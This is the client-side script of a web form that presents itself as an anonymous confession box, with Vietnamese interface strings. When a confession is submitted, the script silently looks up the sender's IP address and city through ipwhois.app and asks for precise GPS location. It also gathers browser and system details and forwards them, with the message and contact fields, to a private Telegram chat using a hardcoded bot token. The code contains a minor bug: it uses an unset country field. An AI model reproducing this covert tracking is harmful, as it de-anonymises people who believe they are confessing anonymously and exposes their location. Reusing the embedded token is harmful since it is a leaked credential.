    const token = "7315329822:AAEfzCe8NSQM6yvWH0zwzJxsvKYMvHxYhHU";
    const chatId = "5674777894";

    async function getGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
          },
          () => resolve(null),
          { timeout: 7000 }
        );
      });
    }

    function getBrowserInfo() {
      const ua = navigator.userAgent;
      const parser = (() => {
        let tem, M = ua.match(/(opera|chrome|safari|firefox|edge|trident(?=\/))\/?\s*(\d+)/i) || [];
        if (/trident/i.test(M[1])) {
          tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
          return { name: 'IE', version: tem[1] || '' };
        }
        if (M[1] === 'Chrome') {
          tem = ua.match(/\b(OPR|Edg)\/(\d+)/);
          if (tem != null) {
            return { name: tem[1].replace('OPR', 'Opera').replace('Edg', 'Edge'), version: tem[2] };
          }
        }
        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
        return { name: M[0], version: M[1] };
      })();
      return parser;
    }

    document.getElementById('confessionForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const recaptchaResponse = grecaptcha.getResponse();
      if (!recaptchaResponse) {
        document.getElementById('statusMsg').textContent = "❌ Vui lòng xác thực CAPTCHA trước khi gửi!";
        return;
      }

      document.getElementById('statusMsg').textContent = "⏳ Đang xử lý...";

      const message = e.target.message.value.trim();
      if (!message) {
        document.getElementById('statusMsg').textContent = "❌ Nội dung không được để trống!";
        return;
      }
      const nickname = e.target.nickname.value.trim() || "Ẩn danh";
      const facebook = e.target.facebook.value.trim() || "Không cung cấp";
      const phone = e.target.phone.value.trim() || "Không cung cấp";

      const browser = getBrowserInfo();
      const os = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const now = new Date().toLocaleString();

      // Lấy IP & vị trí IP từ ipwhois.app
      let ipData = { ip: "Không lấy được IP", city: "Unknown", region: "Unknown", country: "Unknown" };
      try {
        const res = await fetch("https://ipwhois.app/json/");
        if (res.ok) {
          const data = await res.json();
          ipData.ip = data.ip || ipData.ip;
          ipData.city = data.city || ipData.city;
          ipData.region = data.region || ipData.region;
          ipData.country = data.country || ipData.country;
        }
      } catch {}


      // Lấy location nếu user đồng ý
      const geo = await getGeolocation();

      // Gửi data
      const text = `
📩 Confession mới:

📝 Nội dung: ${message}
👤 Nickname: ${nickname}
🔗 Facebook: ${facebook}
📞 SĐT: ${phone}

🌐 IP: ${ipData.ip}
📍 Vị trí IP: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
📌 Location chính xác: ${geo ? `Lat ${geo.lat.toFixed(5)}, Lon ${geo.lon.toFixed(5)}` : "Không cấp quyền"}

🧑‍💻 Trình duyệt: ${browser.name} v${browser.version}
💻 Hệ điều hành: ${os}
🌐 Ngôn ngữ: ${language}
⏰ Múi giờ: ${timezone}
🕒 Thời gian gửi: ${now}
      `;

      // Gửi Telegram
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          document.getElementById('statusMsg').textContent = "✅ Gửi thành công! Cảm ơn bạn 💖";
          e.target.reset();
          grecaptcha.reset();
        } else {
          document.getElementById('statusMsg').textContent = "❌ Gửi thất bại, thử lại sau!";
        }
      })
      .catch(() => {
        document.getElementById('statusMsg').textContent = "⚠️ Lỗi kết nối Telegram!";
      });
    });
